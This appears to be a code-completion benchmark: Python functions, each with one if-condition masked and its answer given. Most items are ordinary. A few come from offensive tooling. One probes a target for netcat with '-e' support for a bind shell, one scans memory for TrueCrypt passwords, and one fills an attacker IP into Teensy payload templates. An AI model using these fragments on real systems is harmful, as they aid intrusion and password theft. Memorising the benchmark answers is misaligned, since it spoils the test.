938,def startInputThread(self):<tab># cv.acquire()<tab># Fix Python 2.x.<tab>global input<tab>try:<tab><tab>input = raw_input<tab>except NameError:<tab><tab>pass<tab>while True:<tab><tab>cmd = (<tab><tab><tab>self._queuedCmds.pop(0)<tab><tab><tab><IF-STMT><tab><tab><tab>else input(self.getPrompt()).strip()<tab><tab>)<tab><tab>wait = self.execCmd(cmd)<tab><tab>if wait:<tab><tab><tab>self.acceptingInput = False<tab><tab><tab>self.blockingQueue.get(True)<tab><tab><tab># cv.wait()<tab><tab><tab># self.inputThread.wait()<tab><tab>self.acceptingInput = True,if len ( self . _queuedCmds ),181
939,"def apply_list(self, expr, rules, evaluation):<tab>""ReplaceRepeated[expr_, rules_]""<tab>try:<tab><tab>rules, ret = create_rules(rules, expr, ""ReplaceRepeated"", evaluation)<tab>except PatternError:<tab><tab>evaluation.message(""Replace"", ""reps"", rules)<tab><tab>return None<tab>if ret:<tab><tab>return rules<tab>while True:<tab><tab>evaluation.check_stopped()<tab><tab>result, applied = expr.apply_rules(rules, evaluation)<tab><tab>if applied:<tab><tab><tab>result = result.evaluate(evaluation)<tab><tab><IF-STMT><tab><tab><tab>expr = result<tab><tab>else:<tab><tab><tab>break<tab>return result",if applied and not result . same ( expr ) :,166
940,"def local_gpua_softmax_dnn_grad(op, ctx_name, inputs, outputs):<tab>if not dnn_available(ctx_name):<tab><tab>return<tab>ins = []<tab>for n in inputs:<tab><tab>n = as_gpuarray_variable(n, ctx_name)<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>ins.append(n.dimshuffle(0, ""x"", 1, ""x""))<tab>out = GpuDnnSoftmaxGrad(""accurate"", ""instance"")(<tab><tab>gpu_contiguous(ins[0]), gpu_contiguous(ins[1])<tab>)<tab>return [out.dimshuffle(0, 2)]",if n . ndim != 2 :,155
941,"def _geo_indices(cls, inspected=None):<tab>inspected = inspected or []<tab>geo_indices = []<tab>inspected.append(cls)<tab>for field in cls._fields.values():<tab><tab>if hasattr(field, ""document_type""):<tab><tab><tab>field_cls = field.document_type<tab><tab><tab>if field_cls in inspected:<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>geo_indices += field_cls._geo_indices(inspected)<tab><tab>elif field._geo_index:<tab><tab><tab>geo_indices.append(field)<tab>return geo_indices","if hasattr ( field_cls , ""_geo_indices"" ) :",155
942,"def get_skip_list(self, handle):<tab>todo = [handle]<tab>skip = [handle]<tab>while todo:<tab><tab>handle = todo.pop()<tab><tab>for child in self.dbstate.db.find_backlink_handles(handle, [""Place""]):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>todo.append(child[1])<tab><tab><tab><tab>skip.append(child[1])<tab>return skip",if child [ 1 ] not in skip :,108
943,"def convertstore(self, inputstore, includefuzzy=False):<tab>""""""converts a file to .lang format""""""<tab>thetargetfile = lang.LangStore(mark_active=self.mark_active)<tab># Run over the po units<tab>for pounit in inputstore.units:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>newunit = thetargetfile.addsourceunit(pounit.source)<tab><tab>if includefuzzy or not pounit.isfuzzy():<tab><tab><tab>newunit.settarget(pounit.target)<tab><tab>else:<tab><tab><tab>newunit.settarget("""")<tab><tab>if pounit.getnotes(""developer""):<tab><tab><tab>newunit.addnote(pounit.getnotes(""developer""), ""developer"")<tab>return thetargetfile",if pounit . isheader ( ) or not pounit . istranslatable ( ) :,196
944,"def api_read(self):<tab>files = []<tab>files.append(""/bin/netcat"")<tab>files.append(""/etc/alternative/netcat"")<tab>files.append(""/bin/nc"")<tab>#<tab> init variables<tab>installed = False<tab>support = False<tab>path = None<tab>for _file in files:<tab><tab>file_content = self.shell.read(_file)<tab><tab><IF-STMT><tab><tab><tab>installed = True<tab><tab><tab>path = _file<tab><tab><tab>if ""-e filename"" in file_content:<tab><tab><tab><tab>support = True<tab><tab><tab>break<tab>result = {<tab><tab>""netcat_installed"": installed,<tab><tab>""supports_shell_bind"": support,<tab><tab>""path"": path,<tab>}<tab>return result",if file_content :,187
945,"def _create_waiter(self, func_name):<tab>if self._waiter is not None:<tab><tab><IF-STMT><tab><tab><tab>if not self._waiter.done():<tab><tab><tab><tab>raise RuntimeError(<tab><tab><tab><tab><tab>""%s() called while connection is "" ""being cancelled"" % func_name<tab><tab><tab><tab>)<tab><tab>else:<tab><tab><tab>raise RuntimeError(<tab><tab><tab><tab>""%s() called while another coroutine is ""<tab><tab><tab><tab>""already waiting for incoming ""<tab><tab><tab><tab>""data"" % func_name<tab><tab><tab>)<tab>self._waiter = create_future(self._loop)<tab>return self._waiter",if self . _cancelling :,154
946,"def calculate(self):<tab>addr_space = utils.load_as(self._config)<tab>for mod in modules.lsmod(addr_space):<tab><tab># Finding the TC kernel module<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>for offset, password in self.scan_module(<tab><tab><tab>addr_space, mod.DllBase, self._config.MIN_LENGTH<tab><tab>):<tab><tab><tab>yield offset, password","if str ( mod . BaseDllName ) . lower ( ) != ""truecrypt.sys"" :",120
947,"def on_touch_up(self, touch):<tab>try:<tab><tab>if not self.h_picker_touch:<tab><tab><tab>return<tab><tab><IF-STMT><tab><tab><tab>if touch.grab_current is not self:<tab><tab><tab><tab>if self.picker == ""hours"":<tab><tab><tab><tab><tab>self.picker = ""minutes""<tab>except AttributeError:<tab><tab>pass<tab>super().on_touch_up(touch)",if not self . animating :,104
948,"def handle(self, *args, **options):<tab>dry_run = options.get(""dry_run"", False)<tab>state = options.get(""state"", None)<tab>if not dry_run:<tab><tab>script_utils.add_file_logger(logger, __file__)<tab>with transaction.atomic():<tab><tab>add_reviews_notification_setting(<tab><tab><tab>notification_type=options[""notification""], state=state<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>raise RuntimeError(""Dry run, transaction rolled back."")",if dry_run :,126
949,"def __call__(self, es, params):<tab>ops = 0<tab>indices = mandatory(params, ""indices"", self)<tab>only_if_exists = params.get(""only-if-exists"", False)<tab>request_params = params.get(""request-params"", {})<tab>for index_name in indices:<tab><tab><IF-STMT><tab><tab><tab>es.indices.delete(index=index_name, params=request_params)<tab><tab><tab>ops += 1<tab><tab>elif only_if_exists and es.indices.exists(index=index_name):<tab><tab><tab>self.logger.info(""Index [%s] already exists. Deleting it."", index_name)<tab><tab><tab>es.indices.delete(index=index_name, params=request_params)<tab><tab><tab>ops += 1<tab>return ops, ""ops""",if not only_if_exists :,198
950,"def find_first_of_filetype(content, filterfiltype, attr=""name""):<tab>""""""Find the first of the file type.""""""<tab>filename = """"<tab>for _filename in content:<tab><tab>if isinstance(_filename, str):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>filename = _filename<tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab>if getattr(_filename, attr).endswith(f"".{filterfiltype}""):<tab><tab><tab><tab>filename = getattr(_filename, attr)<tab><tab><tab><tab>break<tab>return filename","if _filename . endswith ( f"".{filterfiltype}"" ) :",135
951,"def join(s, *p):<tab>path = s<tab>for t in p:<tab><tab>if (not s) or isabs(t):<tab><tab><tab>path = t<tab><tab><tab>continue<tab><tab>if t[:1] == "":"":<tab><tab><tab>t = t[1:]<tab><tab><IF-STMT><tab><tab><tab>path = "":"" + path<tab><tab>if path[-1:] != "":"":<tab><tab><tab>path = path + "":""<tab><tab>path = path + t<tab>return path","if "":"" not in path :",115
952,"def cell_double_clicked(self, row, column):<tab>if column == 3:<tab><tab>archive_name = self.selected_archive_name()<tab><tab>if not archive_name:<tab><tab><tab>return<tab><tab>mount_point = self.mount_points.get(archive_name)<tab><tab><IF-STMT><tab><tab><tab>QDesktopServices.openUrl(QtCore.QUrl(f""file:///{mount_point}""))",if mount_point is not None :,107
953,"def parseLink(line):<tab>parts = line.split()<tab>optional = parts[0] == ""Link*:""<tab>assert optional or parts[0] == ""Link:""<tab>attrs = {}<tab>for attr in parts[1:]:<tab><tab>k, v = attr.split(""="", 1)<tab><tab><IF-STMT><tab><tab><tab>attr_optional = 1<tab><tab><tab>k = k[:-1]<tab><tab>else:<tab><tab><tab>attr_optional = 0<tab><tab>attrs[k] = (attr_optional, v)<tab>return (optional, attrs)","if k [ - 1 ] == ""*"" :",134
954,"def should_wait(self, offer_hash: str):<tab>with self._lock:<tab><tab><IF-STMT><tab><tab><tab>if self._offer_hash != offer_hash:<tab><tab><tab><tab>logger.debug(<tab><tab><tab><tab><tab>""already processing another offer (%s vs %s)"",<tab><tab><tab><tab><tab>self._offer_hash,<tab><tab><tab><tab><tab>offer_hash,<tab><tab><tab><tab>)<tab><tab><tab><tab>return True<tab><tab><tab>if self._started == self._wtct_num_subtasks:<tab><tab><tab><tab>logger.info(""all subtasks for `%s` have been started"", self._offer_hash)<tab><tab><tab><tab>return True<tab><tab>return False",if self . _offer_hash is not None :,167
955,"def list_urls(self):<tab>for idx, job in enumerate(self.urlwatcher.jobs):<tab><tab>if self.urlwatch_config.verbose:<tab><tab><tab>print(""%d: %s"" % (idx + 1, repr(job)))<tab><tab>else:<tab><tab><tab>pretty_name = job.pretty_name()<tab><tab><tab>location = job.get_location()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>print(""%d: %s ( %s )"" % (idx + 1, pretty_name, location))<tab><tab><tab>else:<tab><tab><tab><tab>print(""%d: %s"" % (idx + 1, pretty_name))<tab>return 0",if pretty_name != location :,157
956,"def _encode_realm(self, realm):<tab># override default _encode_realm to fill in default realm field<tab><IF-STMT><tab><tab>realm = self.default_realm<tab><tab>if realm is None:<tab><tab><tab>raise TypeError(<tab><tab><tab><tab>""you must specify a realm explicitly, ""<tab><tab><tab><tab>""or set the default_realm attribute""<tab><tab><tab>)<tab>return self._encode_field(realm, ""realm"")",if realm is None :,105
957,"def set(sensor_spec: dict, **kwargs):<tab>for key, value in kwargs.items():<tab><tab>if key == ""position"":<tab><tab><tab>sensor_spec[""transform""] = SensorSpecs.get_position(value)<tab><tab>elif key == ""attachment_type"":<tab><tab><tab>sensor_spec[key] = SensorSpecs.ATTACHMENT_TYPE[value]<tab><tab><IF-STMT><tab><tab><tab>sensor_spec[key] = SensorSpecs.COLOR_CONVERTER[value]","elif key == ""color_converter"" :",125
958,"def _check_arguments(self, arch, state):<tab># TODO: add calling convention detection to individual functions, and use that instead of the<tab># TODO: default calling convention of the platform<tab>cc = DEFAULT_CC[arch.name](arch)  # type: s_cc.SimCC<tab>for i, expected_arg in enumerate(self.arguments):<tab><tab>if expected_arg is None:<tab><tab><tab>continue<tab><tab>real_arg = cc.arg(state, i)<tab><tab>expected_arg_type, expected_arg_value = expected_arg<tab><tab>r = self._compare_arguments(<tab><tab><tab>state, expected_arg_type, expected_arg_value, real_arg<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return False<tab>return True",if not r :,183
959,"def all_projects():<tab>if not REPODIR:<tab><tab>return<tab># Future: make this path parameterisable.<tab>excludes = set([""tempest"", ""requirements""])<tab>for name in PROJECTS:<tab><tab>name = name.strip()<tab><tab>short_name = name.split(""/"")[-1]<tab><tab>try:<tab><tab><tab>with open(os.path.join(REPODIR, short_name, ""setup.py""), ""rt"") as f:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>continue<tab><tab>except IOError:<tab><tab><tab>continue<tab><tab>if short_name in excludes:<tab><tab><tab>continue<tab><tab>yield (short_name, dict(name=name, short_name=short_name))","if ""pbr"" not in f . read ( ) :",180
960,"def get_converter(self, key, default=None):<tab>""""""Gets a converter for the given key.""""""<tab>if key in self._vars:<tab><tab>return self._vars[key].convert<tab># necessary for keys that match regexes, such as `*PATH`s<tab>for k, var in self._vars.items():<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if k.match(key) is not None:<tab><tab><tab>converter = var.convert<tab><tab><tab>self._vars[key] = var<tab><tab><tab>break<tab>else:<tab><tab>converter = self._get_default_converter(default=default)<tab>return converter","if isinstance ( k , str ) :",154
961,"def get_artist(self, name):<tab>artist = self.artists.get(name)<tab>if not artist:<tab><tab>if self.use_db:<tab><tab><tab>try:<tab><tab><tab><tab>artist = q(m.Artist).filter_by(name=name).one()<tab><tab><tab>except NoResultFound:<tab><tab><tab><tab>pass<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.add_artist(artist)<tab>return artist",if artist and self . ram_cache :,111
962,"def move(self, x, y):<tab>offset = self.h<tab>width = max((len(val.get()) for val in self.values))<tab>for i, label in enumerate(self.labels):<tab><tab><IF-STMT><tab><tab><tab>label.place(x=x, y=y + offset)<tab><tab><tab>label.config(<tab><tab><tab><tab>width=width,<tab><tab><tab><tab>bg=(self.fg if self.selected == i else self.bg),<tab><tab><tab>)<tab><tab><tab>offset += self.h + (self.pady * 2)<tab><tab>else:<tab><tab><tab>label.place(x=9999, y=9999)<tab>return","if self . values [ i ] . get ( ) != """" :",166
963,"def visit_Assign(self, node):<tab>if len(node.targets) == 1:<tab><tab><IF-STMT><tab><tab><tab>plugPath = self.__plugPath(self.__path(node.targets[0]))<tab><tab><tab>if plugPath:<tab><tab><tab><tab>self.plugWrites.add(plugPath)<tab>self.visit(node.value)","if isinstance ( node . targets [ 0 ] , ast . Subscript ) :",93
964,"def _minimal_replacement_cost(self, first, second):<tab>first_symbols, second_symbols = set(), set()<tab>removal_cost, insertion_cost = 0, 0<tab>for a, b in itertools.zip_longest(first, second, fillvalue=None):<tab><tab><IF-STMT><tab><tab><tab>first_symbols.add(a)<tab><tab>if b is not None:<tab><tab><tab>second_symbols.add(b)<tab><tab>removal_cost = max(removal_cost, len(first_symbols - second_symbols))<tab><tab>insertion_cost = max(insertion_cost, len(second_symbols - first_symbols))<tab>return min(removal_cost, insertion_cost)",if a is not None :,173
965,"def normalize_stroke(stroke):<tab>letters = set(stroke)<tab>if letters & _NUMBERS:<tab><tab>if system.NUMBER_KEY in letters:<tab><tab><tab>stroke = stroke.replace(system.NUMBER_KEY, """")<tab><tab># Insert dash when dealing with 'explicit' numbers<tab><tab>m = _IMPLICIT_NUMBER_RX.search(stroke)<tab><tab><IF-STMT><tab><tab><tab>start = m.start(2)<tab><tab><tab>return stroke[:start] + ""-"" + stroke[start:]<tab>if ""-"" in letters:<tab><tab>if stroke.endswith(""-""):<tab><tab><tab>stroke = stroke[:-1]<tab><tab>elif letters & system.IMPLICIT_HYPHENS:<tab><tab><tab>stroke = stroke.replace(""-"", """")<tab>return stroke",if m is not None :,180
966,"def serve_json(self, args=None):<tab>request = current.request<tab>response = current.response<tab>response.headers[""Content-Type""] = ""application/json; charset=utf-8""<tab>if not args:<tab><tab>args = request.args<tab>d = dict(request.vars)<tab>if args and args[0] in self.json_procedures:<tab><tab>s = self.call_service_function(self.json_procedures[args[0]], *args[1:], **d)<tab><tab><IF-STMT><tab><tab><tab>s = s.as_list()<tab><tab>return response.json(s)<tab>self.error()","if hasattr ( s , ""as_list"" ) :",164
967,"def get_art_abs(story_file):<tab>lines = read_text_file(story_file)<tab>lines = [line.lower() for line in lines]<tab>lines = [fix_missing_period(line) for line in lines]<tab>article_lines = []<tab>highlights = []<tab>next_is_highlight = False<tab>for idx, line in enumerate(lines):<tab><tab>if line == """":<tab><tab><tab>continue  # empty line<tab><tab>elif line.startswith(""@highlight""):<tab><tab><tab>next_is_highlight = True<tab><tab><IF-STMT><tab><tab><tab>highlights.append(line)<tab><tab>else:<tab><tab><tab>article_lines.append(line)<tab>article = "" "".join(article_lines)<tab>abstract = "" "".join(highlights)<tab>return article, abstract",elif next_is_highlight :,194
968,"def _get_commands():<tab>proc = Popen([""react-native"", ""--help""], stdout=PIPE)<tab>should_yield = False<tab>for line in proc.stdout.readlines():<tab><tab>line = line.decode().strip()<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if ""Commands:"" in line:<tab><tab><tab>should_yield = True<tab><tab><tab>continue<tab><tab>if should_yield:<tab><tab><tab>yield line.split("" "")[0]",if not line :,111
969,"def _wait_for_state(self, server_id, state, retries=50):<tab>for i in (0, retries):<tab><tab>server = self.ex_get_server(server_id)<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>sleep(5)<tab><tab>if i == retries:<tab><tab><tab>raise Exception(""Retries count reached"")","if server . extra [ ""status"" ] [ ""state"" ] == state :",95
970,"def add_letter(inner_letter):<tab>if inner_letter in alphabet:<tab><tab>wordTrans.append(alphabet[inner_letter])<tab>else:<tab><tab>l2 = stringTools.stripAccents(inner_letter)<tab><tab><IF-STMT><tab><tab><tab>raise KeyError(""Cannot translate "" + inner_letter)<tab><tab>wordTrans.append(alphabet[""^""])<tab><tab>wordTrans.append(alphabet[l2])",if l2 == inner_letter :,105
971,"def _parse_message(data):<tab>try:<tab><tab>jsonrpc_message = json.loads(data, encoding=""utf-8"")<tab><tab>if jsonrpc_message.get(""jsonrpc"") != ""2.0"":<tab><tab><tab>raise InvalidRequest()<tab><tab>del jsonrpc_message[""jsonrpc""]<tab><tab><IF-STMT><tab><tab><tab>return Response(**jsonrpc_message)<tab><tab>else:<tab><tab><tab>return Request(**jsonrpc_message)<tab>except json.JSONDecodeError:<tab><tab>raise ParseError()<tab>except TypeError:<tab><tab>raise InvalidRequest()","if ""result"" in jsonrpc_message . keys ( ) or ""error"" in jsonrpc_message . keys ( ) :",163
972,"def get_buildings_in_range(self):<tab># TODO Think about moving this to the Settlement class<tab>buildings = self.settlement.buildings<tab>for building in buildings:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if (<tab><tab><tab>distances.distance_rect_rect(self.position, building.position)<tab><tab><tab><= self.radius<tab><tab>):<tab><tab><tab>yield building",if building is self :,102
973,"def get_tab_title(self, uuid=None):<tab>""""""Return the title of a parent tab of a given terminal""""""<tab>maker = Factory()<tab>terminal = self.terminator.find_terminal_by_uuid(uuid)<tab>window = terminal.get_toplevel()<tab>root_widget = window.get_children()[0]<tab>if maker.isinstance(root_widget, ""Notebook""):<tab><tab>for tab_child in root_widget.get_children():<tab><tab><tab>terms = [tab_child]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>terms = enumerate_descendants(tab_child)[1]<tab><tab><tab>if terminal in terms:<tab><tab><tab><tab>return root_widget.get_tab_label(tab_child).get_label()","if not maker . isinstance ( terms [ 0 ] , ""Terminal"" ) :",186
974,"def is_valid_origin(origin):<tab>if not settings.SENTRY_ALLOW_ORIGIN:<tab><tab>return False<tab>if settings.SENTRY_ALLOW_ORIGIN == ""*"":<tab><tab>return True<tab>if not origin:<tab><tab>return False<tab>origin = origin.lower()<tab>for value in settings.SENTRY_ALLOW_ORIGIN:<tab><tab><IF-STMT><tab><tab><tab>if value.lower() == origin:<tab><tab><tab><tab>return True<tab><tab>else:<tab><tab><tab>if value.match(origin):<tab><tab><tab><tab>return True<tab>return False","if isinstance ( value , string_types ) :",137
975,"def addr_func(ctx):<tab>nodes = ctx.xpathEval(base_xpath + ""/ip"")<tab>nodes = nodes or []<tab>ret = []<tab>for node in nodes:<tab><tab>addr = node.prop(""address"")<tab><tab>pref = node.prop(""prefix"")<tab><tab>if not addr:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>addr += ""/%s"" % pref<tab><tab>ret.append(addr)<tab>return ret",if pref :,107
976,"def _select_delete(self, select, args, row_index=0, arg_index=0):<tab>count = 0<tab>delete = ""DELETE FROM Cache WHERE rowid IN (%s)""<tab>try:<tab><tab>while True:<tab><tab><tab>with self._transact() as (sql, cleanup):<tab><tab><tab><tab>rows = sql(select, args).fetchall()<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>break<tab><tab><tab><tab>count += len(rows)<tab><tab><tab><tab>sql(delete % "","".join(str(row[0]) for row in rows))<tab><tab><tab><tab>for row in rows:<tab><tab><tab><tab><tab>args[arg_index] = row[row_index]<tab><tab><tab><tab><tab>cleanup(row[-1])<tab>except Timeout:<tab><tab>raise Timeout(count)<tab>return count",if not rows :,193
977,"def _set_checkpointer(self, train_config):<tab>if train_config[""checkpoint""]:<tab><tab># Default to valid split for checkpoint metric<tab><tab>checkpoint_config = train_config[""checkpoint_config""]<tab><tab>checkpoint_metric = checkpoint_config[""checkpoint_metric""]<tab><tab><IF-STMT><tab><tab><tab>checkpoint_config[""checkpoint_metric""] = f""valid/{checkpoint_metric}""<tab><tab>self.checkpointer = Checkpointer(<tab><tab><tab>checkpoint_config, verbose=self.config[""verbose""]<tab><tab>)<tab>else:<tab><tab>self.checkpointer = None","if checkpoint_metric . count ( ""/"" ) == 0 :",142
978,"def mlt_version_is_greater_correct(test_version):<tab>runtime_ver = mlt_version.split(""."")<tab>test_ver = test_version.split(""."")<tab>if runtime_ver[0] > test_ver[0]:<tab><tab>return True<tab>elif runtime_ver[0] == test_ver[0]:<tab><tab>if runtime_ver[1] > test_ver[1]:<tab><tab><tab>return True<tab><tab><IF-STMT><tab><tab><tab>if runtime_ver[2] > test_ver[2]:<tab><tab><tab><tab>return True<tab>return False",elif runtime_ver [ 1 ] == test_ver [ 1 ] :,148
979,"def generate_scraper_test(class_name, host_name):<tab>with open(""templates/test_scraper.py"") as source:<tab><tab>code = source.read()<tab><tab>program = ast.parse(code)<tab><tab>state = GenerateTestScraperState(class_name, host_name, code)<tab><tab>for node in ast.walk(program):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab><tab>output = f""tests/test_{class_name.lower()}.py""<tab><tab>with open(output, ""w"") as target:<tab><tab><tab>target.write(state.result())",if not state . step ( node ) :,154
980,"def _init_fetches(self):<tab>futures = []<tab>for node_id, request in six.iteritems(self._create_fetch_requests()):<tab><tab><IF-STMT><tab><tab><tab>log.debug(""Sending FetchRequest to node %s"", node_id)<tab><tab><tab>future = self._client.send(node_id, request)<tab><tab><tab>future.add_callback(self._handle_fetch_response, request)<tab><tab><tab>future.add_errback(log.error, ""Fetch to node %s failed: %s"", node_id)<tab><tab><tab>futures.append(future)<tab>self._fetch_futures.extend(futures)<tab>self._clean_done_fetch_futures()<tab>return futures",if self . _client . ready ( node_id ) :,176
981,"def discover(cls, path, **kwargs):<tab>if kwargs.pop(""collection"", None) is not None:<tab><tab>raise TypeError(""collection argument must not be given."")<tab>path = expand_path(path)<tab>try:<tab><tab>collections = os.listdir(path)<tab>except OSError as e:<tab><tab>if e.errno != errno.ENOENT:<tab><tab><tab>raise<tab>else:<tab><tab>for collection in collections:<tab><tab><tab>collection_path = os.path.join(path, collection)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>args = dict(collection=collection, path=collection_path, **kwargs)<tab><tab><tab>yield args",if not cls . _validate_collection ( collection_path ) :,167
982,"def writefile(filename, now):<tab>with open(os.path.join(""src/teensy/"" + filename)) as fileopen, open(<tab><tab>os.path.join(core.userconfigpath, ""reports/teensy_{0}.ino"".format(now)), ""w""<tab>) as filewrite:<tab><tab>for line in fileopen:<tab><tab><tab>match = re.search(""IPADDR"", line)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>line = line.replace(""IPADDR"", ipaddr)<tab><tab><tab>match = re.search(""12,12,12,12"", line)<tab><tab><tab>if match:<tab><tab><tab><tab>ipaddr_replace = ipaddr.replace(""."", "","", 4)<tab><tab><tab><tab>line = line.replace(""12,12,12,12"", ipaddr_replace)<tab><tab><tab>filewrite.write(line)",if match :,199
983,"def get_added_files(diff):<tab>""""""hacky approach to extract added files from github diff output""""""<tab>prefix = ""+++ b/""<tab>lastline = None<tab>for line in diff.splitlines():<tab><tab>line = line.strip()<tab><tab><IF-STMT><tab><tab><tab>yield line[len(prefix) :]<tab><tab>lastline = line","if line . startswith ( prefix ) and lastline and lastline == ""--- /dev/null"" :",100
984,"def bpe_decode(tokens: List[str]) -> List[str]:<tab>words = []<tab>pieces: List[str] = []<tab>for t in tokens:<tab><tab><IF-STMT><tab><tab><tab>pieces.append(t[:-2])<tab><tab>else:<tab><tab><tab>words.append("""".join(pieces + [t]))<tab><tab><tab>pieces = []<tab>if len(pieces) > 0:<tab><tab>words.append("""".join(pieces))<tab>return words",if t . endswith ( DecodeMixin . bpe_cont_str ) :,120
985,"def _maybe_encrypt(self, data):<tab>gpgr = self.config.prefs.gpg_recipient<tab>tokeys = [gpgr] if gpgr not in (None, """", ""!CREATE"", ""!PASSWORD"") else None<tab>if self.config.get_master_key():<tab><tab>with EncryptingStreamer(self.config.get_master_key(), delimited=True) as es:<tab><tab><tab>es.write(data)<tab><tab><tab>es.finish()<tab><tab><tab>return es.save(None)<tab>elif tokeys:<tab><tab>stat, edata = GnuPG(self.config, event=GetThreadEvent()).encrypt(<tab><tab><tab>data, tokeys=tokeys<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>return edata<tab>return data",if stat == 0 :,186
986,"def faces_uvs_list(self) -> List[torch.Tensor]:<tab>if self._faces_uvs_list is None:<tab><tab><IF-STMT><tab><tab><tab>self._faces_uvs_list = [<tab><tab><tab><tab>torch.empty((0, 3), dtype=torch.float32, device=self.device)<tab><tab><tab>] * self._N<tab><tab>else:<tab><tab><tab>self._faces_uvs_list = padded_to_list(<tab><tab><tab><tab>self._faces_uvs_padded, split_size=self._num_faces_per_mesh<tab><tab><tab>)<tab>return self._faces_uvs_list",if self . isempty ( ) :,157
987,"def handle_resource_click(self, widget, event):<tab>if event.getButton() == fife.MouseEvent.LEFT:<tab><tab>self.show_resource_menu(widget.parent, widget.parent.parent)<tab>elif event.getButton() == fife.MouseEvent.RIGHT:<tab><tab><IF-STMT><tab><tab><tab># abort resource selection (#1310)<tab><tab><tab>self.hide_resource_menu()<tab><tab>else:<tab><tab><tab># remove the load/unload order<tab><tab><tab>self.add_resource(slot=widget.parent, res_id=0, entry=widget.parent.parent)",if self . resource_menu_shown :,151
988,"def update_device(self, device):<tab>for bridge in self.bridges:<tab><tab>if bridge.device == device:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>bridge.device.ip = device.ip<tab><tab><tab><tab>bridge.device.port = device.port<tab><tab><tab><tab>logger.info(<tab><tab><tab><tab><tab>'Updated device ""{}"" - New settings: {}:{}'.format(<tab><tab><tab><tab><tab><tab>device.label, device.ip, device.port<tab><tab><tab><tab><tab>)<tab><tab><tab><tab>)<tab><tab><tab><tab>self.update()<tab><tab><tab><tab>self.share_bridges()<tab><tab><tab><tab>break",if bridge . device . ip != device . ip or bridge . device . port != device . port :,172
989,"def endElement(self, name, value, connection):<tab>if name == ""OptionGroupName"":<tab><tab>self.name = value<tab>elif name == ""EngineName"":<tab><tab>self.engine_name = value<tab>elif name == ""MajorEngineVersion"":<tab><tab>self.major_engine_version = value<tab>elif name == ""OptionGroupDescription"":<tab><tab>self.description = value<tab>elif name == ""AllowsVpcAndNonVpcInstanceMemberships"":<tab><tab><IF-STMT><tab><tab><tab>self.allow_both_vpc_and_nonvpc = True<tab><tab>else:<tab><tab><tab>self.allow_both_vpc_and_nonvpc = False<tab>elif name == ""VpcId"":<tab><tab>self.vpc_id = value<tab>else:<tab><tab>setattr(self, name, value)","if value . lower ( ) == ""true"" :",194
990,"def log_items(self, interface, action, media, items):<tab>if not items:<tab><tab>return<tab><tab># Log each item<tab>for item in items:<tab><tab>if not item:<tab><tab><tab>continue<tab><tab>log.info(<tab><tab><tab>""[%s:%s](%s) %r (%r)"",<tab><tab><tab>interface,<tab><tab><tab>action,<tab><tab><tab>media,<tab><tab><tab>item.get(""title""),<tab><tab><tab>item.get(""year""),<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab># Log each episode<tab><tab><tab>self.log_episodes(item)","if media == ""shows"" :",150
991,"def _copy_files(self, files, src, dest, message=""""):<tab>for filepath in files:<tab><tab>srcpath = os.path.join(src, filepath)<tab><tab>destpath = os.path.join(dest, filepath)<tab><tab>if message:<tab><tab><tab>print(""{}: {}"".format(message, destpath))<tab><tab><IF-STMT><tab><tab><tab>destdir = os.path.dirname(destpath)<tab><tab><tab>if not os.path.isdir(destdir):<tab><tab><tab><tab>os.makedirs(destdir)<tab><tab><tab>shutil.copy(srcpath, destpath)<tab><tab>elif os.path.exists(destpath):<tab><tab><tab>os.remove(destpath)",if os . path . exists ( srcpath ) :,167
992,"def disconnect(self, endpoint=None):<tab>if endpoint is not None:<tab><tab>conn = self.connections_endpoints.pop(endpoint, None)<tab><tab><IF-STMT><tab><tab><tab>self.connections.pop(conn.get_socket_object(), None)<tab><tab><tab>conn.close()<tab>else:<tab><tab>for _, conn in self.connections_endpoints.items():<tab><tab><tab>conn.close()<tab><tab>self.connections_endpoints = {}<tab><tab>self.connections = {}",if conn :,115
993,"def cisco_inventory(raw):<tab>for match in INVENTORY_RE.finditer(raw):<tab><tab>d = match.groupdict()<tab><tab><IF-STMT><tab><tab><tab>d[""sn""] = None<tab><tab>d[""descr""] = d[""descr""].strip('""')<tab><tab>d[""name""] = d[""name""].strip('""')<tab><tab>yield d","if d [ ""sn"" ] in SERIAL_BLACKLIST :",91
994,"def _dispatchBubblingEvent(self, tag, evtType, evtObject):<tab>for node in tag.parents:<tab><tab>if node is None:  # pragma: no cover<tab><tab><tab>break<tab><tab>if not node._listeners:<tab><tab><tab>continue<tab><tab><IF-STMT>  # pragma: no cover<tab><tab><tab>continue<tab><tab>capture_listeners, bubbling_listeners = self._get_listeners(<tab><tab><tab>node, evtType<tab><tab>)  # pylint:disable=unused-variable<tab><tab>for c in bubbling_listeners:<tab><tab><tab>evtObject.currentTarget = node._node<tab><tab><tab>self.do_dispatch(c, evtObject)",if evtObject . _stoppedPropagation :,165
